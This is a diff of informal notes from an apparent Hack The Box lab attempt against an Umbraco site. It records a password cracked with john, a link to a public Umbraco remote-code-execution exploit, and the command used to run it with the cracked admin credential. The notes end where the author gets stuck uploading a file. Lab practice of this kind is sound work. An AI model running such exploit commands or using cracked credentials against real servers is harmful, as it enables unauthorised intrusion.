@@ -135,7 +135,23 @@ allenwest1@debian:~/Desktop/HTBremote/App_Data$ sudo john -wordlist=~/Desktop/ro
 .
 // admin@htb.local:baconandcheese
 // logged into the website
+// found an exploit @ https://github.com/noraj/Umbraco-RCE/blob/master/exploit.py
 .
 .
 .
-
+allenwest1@debian:~/Desktop$ vim remoteExploit.py                     
+allenwest1@debian:~/Desktop$ python remoteExploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'ls C:'
+.
+.
+.
+// check terminal2.bash and terminal3.bash.
+// it gets real wonky here so just be patient
+// Then I went to select a file to upload onto the site
+// hello.exe
+.
+.
+.
+// So this is where I got stuck. Ill revisit it when I have more patience.
+.
+.
+.
